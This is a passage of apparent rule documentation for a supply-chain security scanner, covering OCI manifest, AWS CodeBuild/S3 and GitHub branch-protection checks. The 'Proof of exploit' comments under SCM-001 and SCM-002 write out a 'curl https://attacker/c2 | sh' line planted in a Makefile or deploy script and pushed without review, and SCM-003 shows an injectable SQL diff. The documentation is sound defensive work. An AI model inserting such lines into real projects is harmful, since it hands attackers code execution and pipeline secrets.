**How this is detected.** The OCI image-spec (1.0+) and Docker Distribution v2 both encode ``schemaVersion: 2`` on every manifest. The older Docker v1 format set ``schemaVersion: 1`` and stored the rootfs as a chain of un-addressed tarballs with the chain identity hashed end-to-end at pull time. Anything below 2 is by definition a non-content-addressed manifest. The detection is a strict equality check against schemaVersion.

**Recommendation.** Rebuild and re-push the image with a current builder (``docker buildx build`` / ``buildah`` / ``ko``) so the registry produces a v2 manifest with content-addressed layer descriptors. Docker Distribution v1 manifests predate the digest-pinned design that lets a client verify a pulled blob matches the manifest the registry served, so a v1 pull has no way to detect tampering between the registry and the runtime. Registries have been refusing v1 pushes for years (Docker Hub since 2019, GHCR / quay.io / ECR / Artifact Registry never supported them on read), but a pre-existing v1 image can still be sitting in a private registry; the rule catches it before that image gets promoted.

**Known false positives.**

- Some internal Harbor / Nexus deployments still proxy legacy Docker images that haven't been rebuilt; a pull succeeds because the proxy upgrades the manifest at request time, but the on-disk JSON if you saved it with ``inspect --raw`` may still report the original schemaVersion. If your registry is doing this in-flight promotion you can suppress; otherwise re-run the build.

**Source:** [`OCI-007`](../providers/oci.md#oci-007) in the [OCI manifest provider](../providers/oci.md).

### `OCI-008`: Manifest references digest using unsupported hash algorithm <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-008 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** The OCI image-spec mandates ``sha256:`` or ``sha512:`` for content descriptors. ``sha1:`` and ``md5:`` were never permitted by the spec but show up occasionally in mirror exports and forensic JSON; this rule catches them.

Detection scope: the config descriptor digest, every layer descriptor digest (single-image manifests), and every sub-manifest entry digest in an image index. The matcher accepts ``sha256:`` and ``sha512:`` as the only valid prefixes; anything else fires.

**Recommendation.** Rebuild and re-push the image so every descriptor (config, layers, sub-manifest entries) carries a ``sha256:`` digest. ``sha512:`` is also acceptable per the OCI spec, but anything weaker (md5, sha1) breaks the integrity guarantee the registry pull is supposed to provide. sha1 has had practical collisions since SHAttered (2017); md5 has had them since the early 2000s. A manifest that pins a layer by sha1 lets an attacker who can produce a colliding blob substitute a different tarball without changing the manifest, the registry's content-addressing then ratifies the substitution.

**Known false positives.**

- Test fixtures and intentionally-corrupt CTF images sometimes use degraded hashes for pedagogical reasons. Suppress on the specific path with an ignore-file when this is the deliberate shape.

**Source:** [`OCI-008`](../providers/oci.md#oci-008) in the [OCI manifest provider](../providers/oci.md).

### `PBAC-000`: PBAC enumeration failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-pbac-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`PBAC-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `PBAC-001`: CodeBuild project has no VPC configuration <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pbac-001 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** A CodeBuild project with no VPC configuration runs in AWS-managed network space, egress to the public internet is unrestricted, every package registry / CDN / arbitrary endpoint is reachable. Inside a VPC, security-group + VPC-endpoint policies become the egress gate, which is the only practical way to limit a compromised build's exfiltration paths.

**Recommendation.** Configure the CodeBuild project to run inside a VPC with appropriate subnets and security groups. Use a NAT gateway or VPC endpoints to control outbound internet access and restrict build nodes to only the network resources they require.

**Source:** [`PBAC-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `PBAC-002`: CodeBuild service role shared across multiple projects <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pbac-002 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited), [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** One CodeBuild service role across many projects means a compromise of any project's build environment grants access to whatever resources every other project's build needs. Per-project roles cap the radius, a backdoor in the ``foo-tests`` build can't reach the ``deploy-prod`` build's secrets if they each have their own role.

**Recommendation.** Create a dedicated IAM service role for each CodeBuild project, scoped to only the permissions that specific project requires. This limits the blast radius if one project's build is compromised.

**Source:** [`PBAC-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `PBAC-003`: CodeBuild security group allows 0.0.0.0/0 all-port egress <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pbac-003 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** A security-group egress rule of ``0.0.0.0/0`` on all ports/protocols means a compromised build can connect to any endpoint on the internet, typosquat-package registry, C2 server, attacker-owned dump endpoint. Even when the build is inside a VPC (PBAC-001), this egress rule negates the network-side gating.

**Recommendation.** Restrict CodeBuild security-group egress to the specific endpoints builds need (package registries, artifact repositories, STS). A wildcard egress rule lets a compromised build exfiltrate to anywhere on the internet.

**Source:** [`PBAC-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `PBAC-005`: CodePipeline stage action roles mirror the pipeline role <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pbac-005 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** When stage actions don't set their own ``roleArn``, they fall back to the pipeline-level role, which is the union of every stage's needs. A compromise of any one stage (typically the build, which runs untrusted code) gains the deploy stage's authority, including production deploy credentials. Per-action roles cap the radius.

**Recommendation.** Give each stage action (Source, Build, Deploy) its own narrowly-scoped IAM role via ``roleArn`` on the action declaration. Sharing the pipeline-level role means a compromise of one action (e.g. a build) gains the permissions the deploy stage also needs.

**Source:** [`PBAC-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `S3-000`: S3 API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-s3-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`S3-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `S3-001`: Artifact bucket public access block not fully enabled <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-s3-001 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** S3 Block Public Access is the bucket-level circuit breaker that supersedes any future ACL or bucket-policy edit. Without all four settings enabled, a misconfigured CloudFormation change or a stray ``aws s3api`` call can re-expose the bucket to the public, even if the bucket had previously been private.

**Recommendation.** Enable all four S3 Block Public Access settings on the artifact bucket: BlockPublicAcls, IgnorePublicAcls, BlockPublicPolicy, and RestrictPublicBuckets.

**Source:** [`S3-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `S3-002`: Artifact bucket server-side encryption not configured <span class="pg-sev pg-sev--high">HIGH</span> { #detail-s3-002 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Default bucket encryption applies SSE-S3 (AES256) to every PutObject. As of January 2023, AWS enables this on all new buckets automatically, but existing buckets created before then can still be unencrypted unless explicitly configured. Without it, individual objects can be uploaded without encryption (the client gets to choose).

**Recommendation.** Enable default bucket encryption using at minimum AES256 (SSE-S3). For stronger key control, use SSE-KMS with a customer-managed key.

**Source:** [`S3-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `S3-003`: Artifact bucket versioning not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-s3-003 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance, [`ESF-C-ROLLBACK`](#ctrl-esf-c-rollback) Automated rollback on deployment failure or alarm.

**How this is detected.** Versioning makes overwrites and deletes recoverable: the previous content of an object survives until lifecycle expires it. Without versioning, an artifact overwrite (a bad pipeline run, a malicious replacement, a typo'd ``aws s3 cp``) is unrecoverable, the original bytes are gone.

**Recommendation.** Enable S3 versioning on the artifact bucket so that previous artifact versions are retained and rollback is possible. Combine with a lifecycle rule to expire old versions after a retention period.

**Source:** [`S3-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `S3-004`: Artifact bucket access logging not enabled <span class="pg-sev pg-sev--low">LOW</span> { #detail-s3-004 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** S3 server access logging records every API operation against the bucket, who, when, what object, what method. CloudTrail data events overlap but cost more; access logs are the cheap baseline. Without them, an exfiltration via ``GetObject`` doesn't leave a trail you can investigate.

**Recommendation.** Enable S3 server access logging for the artifact bucket and direct logs to a separate, centralized logging bucket with restricted write access.

**Source:** [`S3-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `S3-005`: Artifact bucket missing aws:SecureTransport deny <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-s3-005 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** S3 endpoints accept HTTP and HTTPS by default. Without an explicit Deny on ``aws:SecureTransport=false``, a plaintext request, typically from a misconfigured client or a SDK with a stale endpoint, is honored if signed. The bucket policy Deny is the only enforcement; no account-level switch covers it.

**Recommendation.** Add a Deny statement for s3:* with Bool aws:SecureTransport=false.

**Source:** [`S3-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SCM-001`: Default branch has no protection rule <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-001 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Without a branch protection rule on the default branch, anyone with write access can force-push, delete the branch, or merge directly without review. Even when CI runs on the branch, an unprotected default branch lets a single compromised maintainer rewrite history and erase the audit trail. The check is sourced from the GitHub REST API (``GET /repos/{owner}/{repo}/branches/{branch}/protection``); a 404 response is itself the failure signal.

**Recommendation.** Add a branch protection rule on the default branch in the repository's Settings -> Branches. At minimum require pull request reviews before merging, require status checks to pass, and disable force-pushes / deletions. Match the rule to OpenSSF Scorecard's Branch-Protection thresholds for the organization's compliance baseline.

**Seen in the wild.**

- Numerous post-incident reports (PyPI / RubyGems package compromises 2018-2024) trace the initial maintainer-account takeover step to the absence of branch protection: the attacker pushed a single tampered commit to the default branch, the release pipeline ran on push, the malicious build shipped to the registry within minutes, and recovery required force-pushing the audit trail itself. Branch protection turns the entire class of attack into a review-then-merge gate.

**Proof of exploit.**

```
# With no protection rule on ``main``, a single compromised
# maintainer credential is enough to ship a tampered build:
#
#   git checkout main
#   echo 'curl https://attacker/c2 | sh' >> Makefile
#   git commit -am 'fix: tweak'
#   git push origin main           # no review required
#   # CI now runs the tampered build with full secret access.
#
# Recovery needs force-push to rewrite the trail:
#   git push --force origin main   # also unprotected
#
# A protection rule with `required_pull_request_reviews` set
# and `allow_force_pushes: false` blocks both the push and
# the rewrite without giving up an inch of velocity.
```

**Source:** [`SCM-001`](../providers/scm.md#scm-001) in the [SCM provider](../providers/scm.md).

### `SCM-002`: Default branch protection does not require pull request reviews <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-002 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``required_pull_request_reviews.required_approving_review_count`` from the branch protection payload. Fires when the field is absent (no review requirement at all) or when the count is 0. ``SCM-001`` covers the case where no protection rule exists; this rule scopes specifically to the review-count knob inside an existing rule.

**Recommendation.** In the default-branch protection rule, enable ``Require a pull request before merging`` and set the minimum approving review count to at least 1 (Scorecard's threshold for Branch-Protection's middle tier; raise to 2 for higher trust). Combine with ``Dismiss stale pull request approvals when new commits are pushed`` so a force-push doesn't carry an old approval forward.

**Known false positives.**

- ``required_pull_request_reviews.bypass_pull_request_allowances`` is covered by ``SCM-018``: a protection rule that requires reviews but lists every contributor in the bypass allowlist still passes this rule even though the control is unenforced in practice. Read SCM-002 + SCM-018 as a pair when auditing whether required review actually fires.

**Proof of exploit.**

```
# With protection but no required reviews, a maintainer can
# self-approve a tampered change in two clicks:
#
#   git checkout -b release-fix
#   echo 'curl https://attacker/c2 | sh' >> deploy.sh
#   git commit -am 'fix: handle edge case'
#   git push origin release-fix
#   gh pr create --fill
#   gh pr merge --squash --auto    # no second-set-of-eyes
#   # Release pipeline runs the tampered build with full
#   # production secrets in scope.
#
# Setting ``required_approving_review_count`` to >= 1 forces
# a separate identity to acknowledge the change before merge.
```

**Source:** [`SCM-002`](../providers/scm.md#scm-002) in the [SCM provider](../providers/scm.md).

### `SCM-003`: GitHub default code scanning is not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-003 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Reads ``state`` from the default code-scanning setup endpoint (``GET /repos/{owner}/{repo}/code-scanning/default-setup``). Fires when ``state`` is anything other than ``configured`` (``not-configured``, missing, or 404). This check only evaluates the default-setup endpoint. Repos running hand-authored CodeQL workflows or third-party SARIF uploads can still fail SCM-003; suppress per repo via ignore-file when that alternative coverage is intentional.

**Recommendation.** Enable default code scanning under the repository's Settings -> Code security -> Code scanning -> Default. The GitHub-managed CodeQL setup picks the right languages automatically and writes findings into the Code Scanning UI on every push and PR. Teams that already ship a CodeQL workflow can leave this rule's check off — but the default setup is the lowest-friction path for repos that don't have one.

**Known false positives.**

- Repos that ship a hand-authored CodeQL workflow (or use Semgrep / Snyk / another SAST whose results land in the Code Scanning UI via SARIF upload) get the same coverage without enabling default setup. Suppress via ignore-file rather than removing the rule.

**Proof of exploit.**

```
# Without code scanning, the only signal that a PR
# introduces (e.g.) a SQL injection or hardcoded secret
# comes from the human reviewer:
#
#   - def lookup(user_id):
#   -     return db.query("SELECT * FROM u WHERE id = ?", user_id)
#   + def lookup(user_id):
#   +     return db.query(f"SELECT * FROM u WHERE id = {user_id}")
#
# A reviewer skimming a 400-line PR misses this. Default
# CodeQL setup catches the same change as a CWE-89 finding
# in the PR check, surfaces it inline in the diff, and
# blocks the merge if the protection rule wires it up as
# a required status check (see SCM-008).
```

**Source:** [`SCM-003`](../providers/scm.md#scm-003) in the [SCM provider](../providers/scm.md).

### `SCM-004`: GitHub secret scanning is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-004 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Reads ``security_and_analysis.secret_scanning.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Public repos get secret scanning free since 2023; private repos require a GitHub Advanced Security license. Without secret scanning, a credential committed even briefly is recoverable from git history indefinitely.

**Recommendation.** Enable secret scanning under the repository's Settings -> Code security -> Secret scanning. The GitHub-managed scanner covers ~200 token patterns from major providers and runs on every push. Pair with push protection so secrets are blocked at commit time rather than caught after the fact.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. The fix is to grant the token admin scope on the repo (or re-run with a personal token from a maintainer) rather than to suppress the rule.

**Seen in the wild.**

- GitGuardian's annual State of Secrets Sprawl reports find millions of fresh credential leaks per year across public GitHub commits, with the median time-to-revocation measured in days. Native secret scanning alerts the maintainer within minutes of the push, collapsing the exploitable window from days to minutes for the patterns it covers.

**Source:** [`SCM-004`](../providers/scm.md#scm-004) in the [SCM provider](../providers/scm.md).

### `SCM-005`: Dependabot security updates are not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-005 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Reads ``security_and_analysis.dependabot_security_updates.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Without security updates, the team has to discover and triage CVEs against their dependency graph manually — a delay measured in days or weeks even on attentive teams, vs hours when the bot opens the PR for them.

**Recommendation.** Enable Dependabot security updates under the repository's Settings -> Code security -> Dependabot. The bot opens a PR with the minimum-required upgrade for each open advisory against an in-use dependency. Pair with version-update config (``.github/dependabot.yml``) so routine bumps don't rely on the security-update path.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that delegate dependency-update PRs to Renovate, Snyk, or another bot get equivalent coverage without Dependabot. Suppress via ignore-file rather than removing the rule.

**Source:** [`SCM-005`](../providers/scm.md#scm-005) in the [SCM provider](../providers/scm.md).

### `SCM-006`: Default branch protection does not require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-006 }

**Evidences:** [`ESF-D-TAMPER`](#ctrl-esf-d-tamper) Protect build artifacts from tampering and detect unauthorized modification.

**How this is detected.** Reads ``required_signatures.enabled`` from the branch protection payload. Fires when the field is missing or False. Required signatures don't validate signature authenticity (the GitHub web UI does that lazily on render), but a missing signature is rejected at push time, which blocks the most common compromise pattern: a stolen personal access token used to push under the maintainer's name without their signing key.

**Recommendation.** In the default-branch protection rule, enable ``Require signed commits``. Configure GPG, SSH, or S/MIME signatures for every contributor's git client (``git config commit.gpgsign true`` plus an uploaded public key). Pair with branch protection's ``Restrict who can push to matching branches`` so only signed commits from authorized identities land on the default branch.

**Source:** [`SCM-006`](../providers/scm.md#scm-006) in the [SCM provider](../providers/scm.md).

### `SCM-007`: Default branch protection allows force-pushes <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-007 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``allow_force_pushes.enabled`` from the branch protection payload. Fires when the value is True. The complementary deletion-protection knob is covered by ``SCM-009``; this rule focuses on the rewrite-history attack class because force-push is the primitive every post-incident rewrite uses to clean up after itself.

**Recommendation.** In the default-branch protection rule, set ``Allow force pushes`` to ``Disabled``. Force-pushes overwrite the audit trail; an attacker who lands a malicious commit can erase evidence of it after the fact. Also set ``Allow deletions`` to ``Disabled`` so the branch itself can't be wiped.

**Source:** [`SCM-007`](../providers/scm.md#scm-007) in the [SCM provider](../providers/scm.md).

### `SCM-008`: Default branch protection does not require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-008 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``required_status_checks.contexts`` (or the newer ``checks`` shape) from the branch protection payload. Fires when the field is missing or the contexts list is empty. Without required checks the merge gate degrades to human-only review; SCM-002 covers the review knob, this rule covers the automated-verification knob, and both should be on for high-trust default branches.

**Recommendation.** In the default-branch protection rule, enable ``Require status checks to pass before merging`` and list every check the team relies on (CI build, code scanning, secret scanning, lint). Set ``strict: true`` (``Require branches to be up to date before merging``) so a stale base doesn't land regressions the latest checks would catch.

**Known false positives.**

- The ``restrictions`` block (users / teams / apps allowed to push directly to the protected branch) is not consulted today: a rule that requires status checks but lists every contributor in the push-restrictions allowlist still passes this rule even though those identities can land code without the checks running. Audit the allowlist in the GitHub UI when this rule passes on a high-trust repo.
- Status-check names are matched as opaque strings; a configured required check that no workflow actually emits (typo, deleted job) will still pass this rule. The check would block the merge in practice (GitHub waits for the named context forever), but the misconfiguration itself isn't visible from the protection payload.

**Source:** [`SCM-008`](../providers/scm.md#scm-008) in the [SCM provider](../providers/scm.md).

### `SCM-009`: Default branch protection allows branch deletion <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-009 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``allow_deletions.enabled`` from the branch protection payload. Fires when the value is True. Pairs with SCM-007 (force-push allowed) — the two flags together cover the complete rewrite-history attack class.

**Recommendation.** In the default-branch protection rule, set ``Allow deletions`` to ``Disabled``. A deleted default branch wipes every protection rule attached to it; an attacker with write access can delete the branch, recreate it from a tampered commit, and re-apply protection in a way that looks identical from the UI.

**Source:** [`SCM-009`](../providers/scm.md#scm-009) in the [SCM provider](../providers/scm.md).

### `SCM-010`: Branch protection allows administrators to bypass <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-010 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``enforce_admins.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with every other SCM-NNN rule that reads a branch-protection knob — without enforce_admins, those rules document intent rather than reality.

**Recommendation.** In the default-branch protection rule, enable ``Do not allow bypassing the above settings`` (a.k.a. ``Include administrators``). Otherwise every other knob you set (required reviews, status checks, signed commits) becomes advisory rather than enforced. A compromised admin account is also a much shorter path to a tampered release than a compromised contributor account, so admins are exactly the identity the gate needs to apply to.

**Source:** [`SCM-010`](../providers/scm.md#scm-010) in the [SCM provider](../providers/scm.md).

### `SCM-011`: Default branch protection does not require CODEOWNERS reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-011 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``required_pull_request_reviews.require_code_owner_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` covers the bare review-count knob; this rule scopes specifically to whose review counts. The check evaluates only the protection-rule toggle; verifying that an actual ``CODEOWNERS`` file exists at ``.github/CODEOWNERS`` (and covers the right paths) is left to the recommendation, since the GitHub API surfaces the file's presence as a separate contents request the SCM provider does not fetch.

**Recommendation.** In the default-branch protection rule, enable ``Require review from Code Owners``. Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (or ``docs/CODEOWNERS``) mapping directories to the team or individual responsible. The GitHub UI auto-requests review from the matched owners on every PR that touches a covered path; combined with this branch-protection knob, the merge is blocked until they approve.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path don't need the routing CODEOWNERS provides — but the protection knob still helps when a new team member joins. Suppress via ignore-file when the team intentionally stays flat.

**Source:** [`SCM-011`](../providers/scm.md#scm-011) in the [SCM provider](../providers/scm.md).

### `SCM-012`: Default branch protection keeps stale reviews after a push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-012 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``required_pull_request_reviews.dismiss_stale_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` ensures a review is required at all; this rule ensures the approval the team relies on actually corresponds to the diff being merged.

**Recommendation.** In the default-branch protection rule, enable ``Dismiss stale pull request approvals when new commits are pushed``. Approvals will be cleared every time the PR head moves; the reviewer has to re-approve the latest diff before merge, closing the time-of-check / time-of-use gap an attacker can exploit by amending the branch after approval.

**Source:** [`SCM-012`](../providers/scm.md#scm-012) in the [SCM provider](../providers/scm.md).

### `SCM-013`: Default branch protection does not require conversation resolution <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-013 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``required_conversation_resolution.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Severity is LOW because the rule documents process discipline rather than a structural vulnerability — but unresolved security comments are a common upstream cause of incidents.

**Recommendation.** In the default-branch protection rule, enable ``Require conversation resolution before merging``. PRs cannot land until every review comment is marked resolved. The friction is small (the PR author clicks ``Resolve`` after addressing) and the payoff is concrete: review comments can't be ignored to ship faster.

**Source:** [`SCM-013`](../providers/scm.md#scm-013) in the [SCM provider](../providers/scm.md).

### `SCM-014`: Default branch protection does not require approval of the most recent push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-014 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``required_pull_request_reviews.require_last_push_approval`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with SCM-012 (dismiss stale reviews) — both close the same approval-time-of-check / merge-time-of-use gap from different angles.

**Recommendation.** In the default-branch protection rule, enable ``Require approval of the most recent reviewable push``. The reviewer and the most recent pusher must be different identities; an attacker controlling one collaborator account can no longer ship a malicious diff under another collaborator's approval.

**Source:** [`SCM-014`](../providers/scm.md#scm-014) in the [SCM provider](../providers/scm.md).

### `SCM-015`: Secret scanning push protection is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-015 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Reads ``security_and_analysis.secret_scanning_push_protection.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Strongly paired with SCM-004 (secret scanning enabled): SCM-004 catches credentials after the push, SCM-015 stops them at the push. Both should be on for high-trust repos.

**Recommendation.** Enable secret scanning push protection under the repository's Settings -> Code security -> Push protection. Pushes containing matched credential patterns are refused by GitHub before the commit is accepted, so the credential never enters git history. Authors get an immediate remediation prompt; the bypass-with-justification flow preserves the audit trail when a legitimate test-case credential needs to land.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Push protection covers the GitHub-managed pattern set (~200 token patterns from major providers). Custom-pattern support requires GitHub Advanced Security on private repos; public repos get the GitHub-managed set free.

**Source:** [`SCM-015`](../providers/scm.md#scm-015) in the [SCM provider](../providers/scm.md).

### `SCM-016`: Private vulnerability reporting is not enabled <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-016 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Reads ``security_and_analysis.private_vulnerability_reporting.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Severity is LOW because the rule documents process readiness rather than a structural vulnerability — but having no private reporting channel means the next external researcher's report is either a public issue or nothing.

**Recommendation.** Enable private vulnerability reporting under the repository's Settings -> Code security -> Private vulnerability reporting. Researchers get a private ``Security`` tab where they can submit details directly to maintainers; the maintainers can then triage, request a CVE, coordinate disclosure timing, and merge a fix without exposing the bug publicly until ready.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that publish a SECURITY.md with an alternative out-of-band reporting channel (security@ mailbox, HackerOne / Bugcrowd program) cover the same control via a different mechanism. Suppress via ignore-file when the alternative is in place and documented.

**Source:** [`SCM-016`](../providers/scm.md#scm-016) in the [SCM provider](../providers/scm.md).

### `SCM-017`: Repository has no CODEOWNERS file <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-017 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Probes the three canonical CODEOWNERS locations via ``GET /repos/{owner}/{repo}/contents/<path>``. Fires when none of the three returns a file response. Pairs with SCM-011 (the protection-rule toggle): SCM-011 covers intent, SCM-017 covers reality. A repo with both set is auditing the path-scoped review actually happens.

**Recommendation.** Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (the GitHub-recommended location), ``CODEOWNERS`` at the repo root, or ``docs/CODEOWNERS``. Map directories to the team or individual responsible for them. With SCM-011's ``require_code_owner_reviews`` knob enabled, GitHub auto-requests review from the matched owners on every PR; without the file, the toggle is meaningless and any reviewer can approve any change.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path may legitimately skip CODEOWNERS — the file adds no routing in that case. Suppress via ignore-file when the team intentionally stays flat. The same suppression applies to SCM-011.

**Source:** [`SCM-017`](../providers/scm.md#scm-017) in the [SCM provider](../providers/scm.md).

### `SCM-018`: Required PR reviews can be bypassed by named identities <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-018 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``required_pull_request_reviews.bypass_pull_request_allowances`` from the branch protection payload. Fires when any of ``users`` / ``teams`` / ``apps`` is non-empty. Surfaces the counts so the operator can locate the bypass entries in the GitHub UI without re-running the audit manually.

**Recommendation.** In the default-branch protection rule, clear ``Allow specified actors to bypass required pull requests`` (``required_pull_request_reviews.bypass_pull_request_allowances`` in the API). Required reviews are only as strong as the bypass list. If a release-bot account needs to merge automated PRs, prefer a separate protection rule for the bot's branch namespace rather than a bypass entry on the default branch.

**Seen in the wild.**

